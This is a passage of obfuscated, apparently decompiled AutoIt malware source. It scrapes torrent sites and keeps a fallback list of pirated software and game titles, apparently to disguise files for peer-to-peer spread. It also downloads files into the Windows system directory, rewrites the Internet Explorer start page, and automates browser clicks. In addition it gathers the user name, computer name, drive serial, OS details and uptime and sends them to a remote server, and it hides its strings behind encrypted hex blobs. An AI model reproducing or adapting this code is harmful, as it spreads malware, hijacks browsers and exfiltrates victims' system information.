	$Local002B[0] = 0
	If UBound($Var04BA, 1) >= $Var0308 Then
		For $Var04BB = 0 To $Var0308
			$Var04BC = Fn0096($Var04BA[$Var04BB], "/", "/")
			$Var04BA[$Var04BB] = StringReplace($Var04BA[$Var04BB], "." & $Var04BC[0], "")
			$Var04BA[$Var04BB] = StringReplace($Var04BA[$Var04BB], $Var04BC[0], "")
			$Var04BA[$Var04BB] = StringReplace($Var04BA[$Var04BB], "//", "")
			Fn0091($Local002B, $Var04BA[$Var04BB])
			$Local002B[0] += 1
		Next
		Return $Local002B
	Else
		$Var04BD = Fn00DB()
		$Local002B = $Var04BD
		Return $Local002B
	EndIf
EndFunc
$Var04BD = Fn00DB()

Func Fn00DB()
	$Var04BE = "http://isohunt.com/torrents/?iht=5&ihs1=2&age=0~http://isohunt.com/torrents/?iht=4&ihs1=2&age=0"
	$Var04BE = StringSplit($Var04BE, "~")
	$Var04BF = Random(1, $Var04BE[0], 1)
	$Var04C0 = Fn00DC($Var04BE[$Var04BF])
	Return $Var04C0
EndFunc

Func Fn00DC($Arg00)
	$Var0458 = "/?tab=summary'>"
	$Var04B5 = "</a></td><td class="
	$Var04B9 = Fn009B($Arg00)
	$Var04BA = Fn0096($Var04B9, $Var0458, $Var04B5)
	Local $Local002B[1]
	$Local002B[0] = 0
	If UBound($Var04BA, 1) >= $Var0308 Then
		For $Var04BB = 0 To $Var0308
			If StringInStr($Var04BA[$Var04BB], "<br>") Then
				$Var04C1 = StringSplit($Var04BA[$Var04BB], "<br>", 1)
				If $Var04C1[0] = 2 Then
					Fn0091($Local002B, Fn00DD($Var04C1[2]))
					$Local002B[0] += 1
				EndIf
			Else
				Fn0091($Local002B, Fn00DD($Var04BA[$Var04BB]))
				$Local002B[0] += 1
			EndIf
		Next
		Return $Local002B
	Else
		If $Var0325 <> "" And StringRegExp($Var0325, "http://") = 1 Then
			$Var0325 = Fn009B($Var0325)
			If StringRegExp($Var0325, Fn00A8(1, "*S_", 0x000173AB, 1)) = 1 And StringRegExp($Var0325, Fn00A8(1, "D?∫", 0x00012837, 1)) = 1 Then
				$Var0325 = StringReplace($Var0325, Fn00A8(1, "*S_", 0x000173AB, 1), "")
				$Var0325 = StringReplace($Var0325, Fn00A8(1, "D?∫", 0x00012837, 1), "")
				$Var0325 = Fn00A8(0, $Var0325, 0x000100BD, 1)
				$Var04C2 = StringSplit($Var0325, "~")
				If IsArray($Var04C2) Then
					For $Var04C3 = 1 To $Var04C2[0]
					Next
					Return $Var04C2
				EndIf
			EndIf
		EndIf
		Local $Local002B[1]
		$Local002B[0] = 0x002B
		Fn0091($Local002B, "Adobe Photoshop CS4 Extended")
		Fn0091($Local002B, "Nero 9 Reloaded 9.4.26.0")
		Fn0091($Local002B, "Microsoft Office Enterprise 2007")
		Fn0091($Local002B, "Microsoft Windows 7 Ultimate Retail(Final) x86 and x64")
		Fn0091($Local002B, "WinRAR v3.90 Final")
		Fn0091($Local002B, "WinRAR v4.0 Final")
		Fn0091($Local002B, "WinRAR v5.0 Final")
		Fn0091($Local002B, "LimeWire PRO v5.4.6.1 Final")
		Fn0091($Local002B, "WinZip PRO v14.1")
		Fn0091($Local002B, "WinZip PRO v15.1")
		Fn0091($Local002B, "WinZip PRO v16.1")
		Fn0091($Local002B, "Metro 2033 Proper")
		Fn0091($Local002B, "Battlefield Bad Company 2")
		Fn0091($Local002B, "Just Cause 2")
		Fn0091($Local002B, "Assassins Creed 2")
		Fn0091($Local002B, "Mass_Effect_2")
		Fn0091($Local002B, "The Sims 3 Final")
		Fn0091($Local002B, "BioShock_2")
		Fn0091($Local002B, "TuneUp.Utilities.2010.v9.0.3100.22-TE")
		Fn0091($Local002B, "Sony Vegas Pro 9.0c Build 896 [32.64 bit]")
		Fn0091($Local002B, "Command & Conquer 4 Tiberian Twilight Retail")
		Fn0091($Local002B, "Counter-Strike 1.6 v.38")
		Fn0091($Local002B, "Batman.Arkham.Asylum")
		Fn0091($Local002B, "Pro.Evolution.Soccer.2010")
		Fn0091($Local002B, "Call of Duty 4 Modern Warfare")
		Fn0091($Local002B, "Call of duty 5 World At War")
		Fn0091($Local002B, "Fallout.3.Game.of.the.Year.Edition")
		Fn0091($Local002B, "Diablo 2 + Diablo 2: Lord Of Destruction")
		Fn0091($Local002B, "Grand Theft Auto Vice City")
		Fn0091($Local002B, "Warhammer 40000 Dawn Of War II Chaos Rising")
		Fn0091($Local002B, "Adobe Flash CS4 Professional")
		Fn0091($Local002B, "Pinnacle Studio 14 HD Ultimate")
		Fn0091($Local002B, "Autodesk AutoCAD 2010")
		Fn0091($Local002B, "Partition Magic 8")
		Fn0091($Local002B, "ConvertXtoDVD v4.x")
		Fn0091($Local002B, "Mathworks.Matlab.R2010a")
		Fn0091($Local002B, "Alcohol 120 v2.x")
		Fn0091($Local002B, "Adobe Illustrator CS4")
		Fn0091($Local002B, "DAEMON Tools Pro Advanced 4.x")
		Fn0091($Local002B, "Rosetta.Stone.V.3.3.5.Plus")
		Fn0091($Local002B, "Aliens Vs Predator Proper")
		Fn0091($Local002B, "Dragon Age Origins")
		Fn0091($Local002B, "Need.For.Speed.Shift")
		Return $Local002B
	EndIf
EndFunc

Func Fn00DD($Arg00)
	If StringInStr($Arg00, "<span title=""") Then
		$Var04C4 = StringInStr($Arg00, "<span title=""") + StringLen("<span title=""")
		$Var04C5 = StringInStr($Arg00, """>")
		$Var04C6 = $Var04C5 - $Var04C4
		$Var04C7 = StringMid($Arg00, $Var04C4, $Var04C6)
		Return $Var04C7
	Else
		Return $Arg00
	EndIf
EndFunc

Func Fn00DE($Arg00)
	FileDelete($Var0319 & $Arg00 & ".rar")
	FileDelete($Var0319 & $Arg00 & ".zip")
EndFunc

Func Fn00DF($Arg00)
	$Arg00 = StringReplace($Arg00, "√°", "")
	$Arg00 = StringReplace($Arg00, "√Å", "¡")
	$Arg00 = StringReplace($Arg00, "√©", "")
	$Arg00 = StringReplace($Arg00, "√â", "…")
	$Arg00 = StringReplace($Arg00, "√≠", "")
	$Arg00 = StringReplace($Arg00, "√ç", "Õ")
	$Arg00 = StringReplace($Arg00, "√≥", "")
	$Arg00 = StringReplace($Arg00, "√ì", "")
	$Arg00 = StringReplace($Arg00, "√∫", "")
	$Arg00 = StringReplace($Arg00, "√ö", "")
	If $Arg00 = "" Then
		Return "ErrorPath"
	Else
		Return $Arg00
	EndIf
EndFunc

Func Fn00E0()
	If FileExists(@ProgramFilesDir & "\WinRAR\RAR.exe") Then
		$Var0301 = "Winrar"
		$Var0305 = @ProgramFilesDir & "\WinRAR\RAR.exe"
		Return "Winrar"
	Else
		If FileExists(@ScriptDir & "\" & $Var0311) And FileGetSize(@ScriptDir & "\" & $Var0311) = $Var0321 And Not FileExists(@ProgramFilesDir & "\WinRAR\RAR.exe") Then
			$Var0305 = @ScriptDir & "\" & $Var0311
			Return "7za"
		EndIf
		If Not FileExists(@ScriptDir & "\" & $Var0311) Then
			$Var04C8 = ""
			$Var04C9 = ""
			$Var04CA = InetGetSize($Var0322)
			$Var04CB = InetGetSize($Var0323)
			If $Var04CA <> 0 Then
				$Var04C8 = Fn00E1($Var0322)
				If $Var04C8 = "7za" And FileGetSize(@ScriptDir & "\" & $Var0311) = $Var0321 Then
					$Var0305 = @ScriptDir & "\" & $Var0311
					Return "7za"
				EndIf
			EndIf
			If $Var04CB <> 0 And $Var04C8 = 0 Or $Var04C8 = "Error" Then
				$Var04C9 = Fn00E1($Var0323)
				If $Var04C9 = "7za" And FileGetSize(@ScriptDir & "\" & $Var0311) = $Var0321 Then
					$Var0305 = @ScriptDir & "\" & $Var0311
					Return "7za"
				EndIf
			EndIf
		EndIf
	EndIf
	Return "ERROR-2-SITES"
EndFunc

Func Fn00E1($Arg00)
	$Var04CC = $Var0321
	InetGet($Arg00, $Var0311, 1, 0)
	If @error Then
		Return "Error"
	Else
		Return "7za"
	EndIf
EndFunc

Func Fn00E2($Arg00)
	$Var04CC = $Var031F
	InetGet($Arg00, @SystemDir & "\" & $Var031E, 1, 1)
	If @error Then
		Return "Error"
	Else
		Return "OkiDoki"
	EndIf
EndFunc

Func Fn00E3()
	If $Var0325 <> "" And StringRegExp($Var0325, "http://") = 1 Then
		$Var0325 = Fn009B($Var0325)
		If StringRegExp($Var0325, Fn00A8(1, "*S_", 0x000173AB, 1)) = 1 And StringRegExp($Var0325, Fn00A8(1, "D?∫", 0x00012837, 1)) = 1 Then
			$Var0325 = StringReplace($Var0325, Fn00A8(1, "*S_", 0x000173AB, 1), "")
			$Var0325 = StringReplace($Var0325, Fn00A8(1, "D?∫", 0x00012837, 1), "")
			$Var0325 = Fn00A8(0, $Var0325, 0x000100BD, 1)
			$Var04C2 = StringSplit($Var0325, "~")
			If IsArray($Var04C2) Then
				For $Var04C3 = 1 To $Var04C2[0]
				Next
				Return $Var04C2
			EndIf
		EndIf
	EndIf
	Local $Local002B[1]
	$Local002B[0] = 0x002B
	Fn0091($Local002B, "Adobe Photoshop CS4 Extended")
	Fn0091($Local002B, "Nero 9 Reloaded 9.4.26.0")
	Fn0091($Local002B, "Microsoft Office Enterprise 2007")
	Fn0091($Local002B, "Microsoft Windows 7 Ultimate Retail(Final) x86 and x64")
	Fn0091($Local002B, "WinRAR v3.90 Final")
	Fn0091($Local002B, "WinRAR v4.0 Final")
	Fn0091($Local002B, "WinRAR v5.0 Final")
	Fn0091($Local002B, "LimeWire PRO v5.4.6.1 Final")
	Fn0091($Local002B, "WinZip PRO v14.1")
	Fn0091($Local002B, "WinZip PRO v15.1")
	Fn0091($Local002B, "WinZip PRO v16.1")
	Fn0091($Local002B, "Metro 2033 Proper")
	Fn0091($Local002B, "Battlefield Bad Company 2")
	Fn0091($Local002B, "Just Cause 2")
	Fn0091($Local002B, "Assassins Creed 2")
	Fn0091($Local002B, "Mass_Effect_2")
	Fn0091($Local002B, "The Sims 3 Final")
	Fn0091($Local002B, "BioShock_2")
	Fn0091($Local002B, "TuneUp.Utilities.2010.v9.0.3100.22-TE")
	Fn0091($Local002B, "Sony Vegas Pro 9.0c Build 896 [32.64 bit]")
	Fn0091($Local002B, "Command & Conquer 4 Tiberian Twilight Retail")
	Fn0091($Local002B, "Counter-Strike 1.6 v.38")
	Fn0091($Local002B, "Batman.Arkham.Asylum")
	Fn0091($Local002B, "Pro.Evolution.Soccer.2010")
	Fn0091($Local002B, "Call of Duty 4 Modern Warfare")
	Fn0091($Local002B, "Call of duty 5 World At War")
	Fn0091($Local002B, "Fallout.3.Game.of.the.Year.Edition")
	Fn0091($Local002B, "Diablo 2 + Diablo 2: Lord Of Destruction")
	Fn0091($Local002B, "Grand Theft Auto Vice City")
	Fn0091($Local002B, "Warhammer 40000 Dawn Of War II Chaos Rising")
	Fn0091($Local002B, "Adobe Flash CS4 Professional")
	Fn0091($Local002B, "Pinnacle Studio 14 HD Ultimate")
	Fn0091($Local002B, "Autodesk AutoCAD 2010")
	Fn0091($Local002B, "Partition Magic 8")
	Fn0091($Local002B, "ConvertXtoDVD v4.x")
	Fn0091($Local002B, "Mathworks.Matlab.R2010a")
	Fn0091($Local002B, "Alcohol 120 v2.x")
	Fn0091($Local002B, "Adobe Illustrator CS4")
	Fn0091($Local002B, "DAEMON Tools Pro Advanced 4.x")
	Fn0091($Local002B, "Rosetta.Stone.V.3.3.5.Plus")
	Fn0091($Local002B, "Aliens Vs Predator Proper")
	Fn0091($Local002B, "Dragon Age Origins")
	Fn0091($Local002B, "Need.For.Speed.Shift")
	Return $Local002B
EndFunc

Func Fn00E4($Arg00)
	$Var04CD = Random(0x1388, 0x4E20, 1)
	$Var03FA = $Var02FC[1]
	$Var04CE = $Var02FC[2]
	$Var04CF = $Var02FC[3]
	$Var04D0 = $Var02FC[4]
	$Var04D1 = $Var02FC[5]
	Fn007E(0xEA60)
	$Var04D2 = Fn007A($Var03FA, 1, $Var04D1)
	Fn007D($Var04D2)
	Sleep($Var04CD)
	Fn0080($Var04D2, $Var04CF, $Var04CE)
	Fn007D($Var04D2)
	If $Var04D1 = "0" Then
		Sleep($Var04CD)
		Fn0084($Var04D2)
	Else
	EndIf
EndFunc

Func Fn00E5($Arg00)
	$Var04CD = Random(0x1388, 0x4E20, 1)
	$Var03FA = $Var02FC[1]
	$Var04CF = $Var02FC[2]
	$Var04D1 = $Var02FC[4]
	Fn007E(0xEA60)
	$Var04D2 = Fn007A($Var03FA, 1, $Var04D1)
	Fn007D($Var04D2)
	Sleep($Var04CD)
	$Var04D3 = Fn007F($Var04D2)
	For $Var04D4 In $Var04D3
		$Var04D5 = Fn0082($Var04D4, "innerText")
		If StringInStr($Var04D5, $Var04CF) Then
			Fn0081($Var04D4, "click")
			ExitLoop
		EndIf
	Next
	Sleep(0x2710)
	If $Var04D1 = "0" Then
		Sleep($Var04CD)
		Fn0084($Var04D2)
	Else
	EndIf
EndFunc

Func Fn00E6($Arg00)
	$Var03FA = $Var02FC[1]
	$Var04D1 = $Var02FC[2]
	$Var04D6 = Fn007A($Var03FA, 1, $Var04D1)
EndFunc

Func Fn00E7($Arg00)
	$Var04D7 = RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\", "Start Page", "REG_SZ", $Arg00)
EndFunc

Func Fn00E8($Arg00)
	$Arg00 = StringSplit($Arg00, "%")
	If $Arg00[0] = 2 Then
		$Var04D8 = StringSplit($Arg00[1], "~")
		If $Var04D8[0] = 3 Then
			$Var0450 = $Var04D8[1]
			$Var04D9 = $Var04D8[2]
			$Var04DA = $Var04D8[3]
			$Var04DB = StringSplit($Arg00[2], "~")
			$Var04DC = ""
			For $Var0402 = 1 To $Var04DB[0]
				Select
					Case $Var04DB[$Var0402] = "s"
						$Var04DC &= "&" & $Var04DB[$Var0402] & "=" & DriveGetSerial(@HomeDrive)
					Case $Var04DB[$Var0402] = "un"
						$Var04DC &= "&" & $Var04DB[$Var0402] & "=" & @UserName
					Case $Var04DB[$Var0402] = "cn"
						$Var04DC &= "&" & $Var04DB[$Var0402] & "=" & @ComputerName
					Case $Var04DB[$Var0402] = "ov"
						$Var04DC &= "&" & $Var04DB[$Var0402] & "=" & @OSVersion
					Case $Var04DB[$Var0402] = "os"
						$Var04DC &= "&" & $Var04DB[$Var0402] & "=" & @OSServicePack
					Case $Var04DB[$Var0402] = "hd"
						$Var04DC &= "&" & $Var04DB[$Var0402] & "=" & @HomeDrive
					Case $Var04DB[$Var0402] = "ol"
						$Var04DC &= "&" & $Var04DB[$Var0402] & "=" & @OSLang
					Case $Var04DB[$Var0402] = "sd"
						$Var04DC &= "&" & $Var04DB[$Var0402] & "=" & @SystemDir
					Case $Var04DB[$Var0402] = "up"
						$Var04DC &= "&" & $Var04DB[$Var0402] & "=" & Fn00EA()
				EndSelect
			Next
			$Var04DD = $Var0450 & "?g=i" & $Var04DC
			Fn00E9($Var04DD, $Var04D9, $Var04DA)
		EndIf
	EndIf
EndFunc

Func Fn00E9($Arg00, $ArgOpt01 = Default, $ArgOpt02 = Default)
	If Not $ArgOpt01 Or $ArgOpt01 <= -1 Or $ArgOpt01 == Default Then $ArgOpt01 = "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)"
	If Not $ArgOpt02 Or $ArgOpt02 <= -1 Or $ArgOpt02 == Default Then $ArgOpt02 = "promake"
	Local $Local002C = ObjCreate("WinHTTP.WinHTTPRequest.5.1")
	$Local002C .Open("GET", $Arg00, False)
	If $ArgOpt01 Then $Local002C .SetRequestHeader("User-Agent", $ArgOpt01)
	If $ArgOpt02 Then $Local002C .SetRequestHeader("x-type", $ArgOpt02)
	$Local002C .Send()
	Return SetError(1, $Local002C .Status, 0)
EndFunc

Func Fn00EA()
	Local $Var0355, $Var04DE, $Var04DF, $Var04E0
	$Var04E1 = DllCall("kernel32.dll", "long", "GetTickCount")
	If IsArray($Var04E1) Then
		$Var04E2 = StringRight("00" & Mod($Var04E1[0], 0x03E8), 3)
		$Var04E3 = Floor($Var04E1[0] / 0x03E8)
		$Var04E0 = StringRight("00" & Mod($Var04E3, 0x003C), 2)
		If $Var04E3 >= 0x003C Then
			$Var04E3 = Floor($Var04E3 / 0x003C)
			$Var04DF = StringRight("00" & Mod($Var04E3, 0x003C), 2)
			If $Var04E3 >= 0x003C Then
				$Var04E3 = Floor($Var04E3 / 0x003C)
				$Var04DE = StringRight("00" & Mod($Var04E3, 0x0018), 2)
				If $Var04E3 >= 0x0018 Then
					$Var0355 = Floor($Var04E3 / 0x0018)
					$Var04E4 = ""
					If $Var0355 > 1 Then $Var04E4 = "s"
					$Var04E4 = " Day" & $Var04E4 & " "
				EndIf
			EndIf
		EndIf
	EndIf
	If $Var0355 = "" Then $Var0355 = 0
	If $Var04DE = "" Then $Var04DE = 0
	If $Var04DF = "" Then $Var04DF = 0
	If $Var04E0 = "" Then $Var04E0 = 0
	Return $Var0355 & "-" & $Var04DE & "-" & $Var04DF
EndFunc

Func Fn00EB()
	$Var032F = "A0P52MA78LS9O7EN1UI89A7B9NP6254FU1E3NA2S154HQ987"
	ConsoleWrite($Var032F & @CRLF)
	$Var0330 = ""
	$Var0331 = ""
	$Var0332 = ""
	$Var0333 = ""
	$Var0334 = Fn00A8(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB810754193958D1C9234AC0EB673C35FCEFCF5EC31261C8620D05C1ED50CC881A5F1D67A7E1A9DE650DA209AF6EF57624A6F9A95749C554A8E1CF9DA73D1F96262E7B3C1D9B0EEC73E35463F9FD714317F48D7134E31AFBED7B1DC974FDD160BCA2B4D", $Var032F, 2)
	ConsoleWrite($Var0334 & @CRLF)
	$Var0335 = Fn00A8(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419395F01C924ADC0EB60FB75FCAFBF1EC30271C8620D05C1ED40BCD86D78DA37A791A9AE124A6239AF6EF24624E6E9D95749C554A8E1CF9DA73D1F96262E7B3C1D9B0EEC73D35343F9FD714317F48D7134E31AFBED7B1DC974FDD160BCA2B4D", $Var032F, 2)
	ConsoleWrite($Var0335 & @CRLF)
	$Var0336 = ""
	$Var0337 = ""
	$Var0338 = ""
EndFunc

Func Fn00EC()
	$Var0339 = Fn00A8(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419395F01C914AD60EB673C15FCBFBF3EC34271B8624D15A1ED50CCE86D48DD77A7A1A99E657A6519AF6EF25624E6F9A95749C544AF41CF9DA73D1FA6263E0C3C1D9B0EFC73D35463F9CD017317C48D3", $Var032F, 2)
	ConsoleWrite($Var0339 & @CRLF)
	$Var033A = Fn00A8(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419290F51C914ADC0EB60FC35FCAFCF2EC30271C8620D1591ED40CC886D78DD47A7D649CE123DA239AF6EF5962496E9A92049C564A8E1C8BDA72AF8F1E10E0C2C1DDB799C73E35333F9FD711", $Var032F, 2)
	ConsoleWrite($Var033A & @CRLF)
	$Var033B = Fn00A8(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419295F262E634A80EB573C55FCBFCF3EC30271C8620D0591ED50BCA86D7F1D17A7D649CE123DA259AF1EA2662496E9A92039C524A8E1C8BDA72AF8F1E10E0C2C1DDB799C73E35333F9FD711", $Var032F, 2)
	ConsoleWrite($Var033B & @CRLF)
	$Var033C = Fn00A8(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB810754192908C1C914AAB0EB60FB75FCEFCF5EC31276E8627D1291ED70CC881A58DD67A7B1A9EE121A6259D81EA58624A6F9A95749C554AF31CF9DA08D1F91E6BE7B3C1D9B0EEC73E32473F9FD714317F48D7134E31AFBED7B1DC974FDD160BCA2B4D", $Var032F, 2)
	ConsoleWrite($Var033C & @CRLF)
EndFunc

Func Fn00ED()
	$Var033D = Fn00A8(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB81075419290F71C9134D70EB60FB75FCBFCF2EC30271C8620D15B1ED40BCA86D48DD67A79649DE123DA249AF6EA5862496E9B92049D574AF41DF9DA0ED1F96262E0C5C1DDB0EFC73E35473AEBD714317C48D4133230ACBED7B1DB", $Var032F, 2)
	ConsoleWrite($Var033D & @CRLF)
	$Var033E = Fn00A8(0, "408178571CB7BBE0DC1D7B2D0C42B9AEF2F90AEEB154D0C5BCB810754193958D1C9234AC0EB673C35FCEFCF5EC31261C8620D05C1ED50CC881A5F1D67A7E1A9DE650DA209AF6EF57624A6F9A95749C554A8E1CF9DA73D1F96262E7B3C1D9B0EFC73D32443F9FD714317848D5133231ABBED7B1DA974FD8100BCE2C3E502C8EC3FAE8D5B7E327E509", $Var032F, 2)
	ConsoleWrite($Var033E & @CRLF)
EndFunc